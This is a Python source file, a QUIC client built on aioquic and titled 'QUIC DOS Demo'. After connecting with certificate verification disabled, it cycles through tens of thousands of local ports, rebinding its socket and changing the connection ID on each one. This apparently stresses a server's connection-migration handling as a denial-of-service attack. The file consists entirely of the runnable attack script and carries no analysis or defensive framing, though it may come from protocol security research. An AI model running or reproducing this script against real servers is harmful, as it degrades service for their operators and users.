import argparse
import asyncio
import logging
import pickle
import ssl
import struct
import socket
from typing import Optional, cast

from aioquic.asyncio.client import connect#, change_transport
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.logger import QuicFileLogger
from multiprocessing import Process
from aioquic.quic.connection import QuicConnectionState

import time

logger = logging.getLogger("client")

class DosClientProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.stream_id = None

    async def send(self, d) -> None:
        data = str(d).encode()

        if self.stream_id == None:
            self.stream_id = self._quic.get_next_available_stream_id()
        self._quic.send_stream_data(self.stream_id, data, end_stream=False)
        self.transmit()

        return

def save_session_ticket(ticket):
    """
    Callback which is invoked by the TLS engine when a new session ticket
    is received.
    """
    logger.info("New session ticket received")


async def change_transport(protocol: QuicConnectionProtocol, new_addr, new_port):
    loop = asyncio.get_event_loop()

    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    completed = False

    try:
        sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        sock.bind((new_addr, new_port, 0, 0))
        completed = True
    finally:
        if not completed:
            sock.close()
    old_socket = protocol._transport
    # connect
    transport, protocol = await loop.create_datagram_endpoint(
        lambda: protocol,
        sock=sock,
    )

    old_socket.close()

def is_closed(client):
    if client._quic._state in  [QuicConnectionState.CLOSING, QuicConnectionState.DRAINING, QuicConnectionState.TERMINATED]:
        return True
    else:
        return False

async def main(
    host: str,
    port: int
) -> None:
    logger.debug(f"Connecting to {host}:{port}")

    if True:
        print("Starting a connection")
        try:
            configuration = QuicConfiguration(alpn_protocols=["dos-demo"], is_client=True)
            configuration.verify_mode = ssl.CERT_NONE
            async with connect(
                host,
                port,
                configuration=configuration,
                session_ticket_handler=save_session_ticket,
                create_protocol=DosClientProtocol,
                local_port=0
            ) as client:
                client = cast(DosClientProtocol, client)

                print("Connected.....")
                with open("data.txt", "r") as f:
                    data = f.read()
                    await client.send(data)

                
                await client.send("END")

                # Wait for the peer to send cid
                while(len(client._quic._peer_cid_available) == 0 and not is_closed(client)):
                    await asyncio.sleep(1)
                
                for port in range(10000, 63000):
                    if is_closed(client):
                        break
                    client.change_connection_id()
                    await change_transport(client, "::ffff:10.0.0.45" , port)
                    logger.debug(f"Changed transport to {port}")
                    client.transmit() 
                    while(len(client._quic._peer_cid_available) == 0 and not is_closed(client)):
                        await asyncio.sleep(1)
                    await asyncio.sleep(0.5)

                await client.wait_closed()
        except ConnectionError:
            print("EXCEPTION: Connection Error")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="QUIC DOS Demo")
    parser.add_argument(
        "--host",
        type=str,
        default="localhost",
        help="The remote peer's host name or IP address",
    )
    parser.add_argument(
        "--port", type=int, default=853, help="The remote peer's port number"
    )
    
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="increase logging verbosity"
    )

    args = parser.parse_args()

    logging.basicConfig(
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
        level=logging.DEBUG if args.verbose else logging.INFO,
        filename="logs/client.log",
        filemode="w"
    )

    
    asyncio.run(
            main(
                host=args.host,
                port=args.port,
        )
    )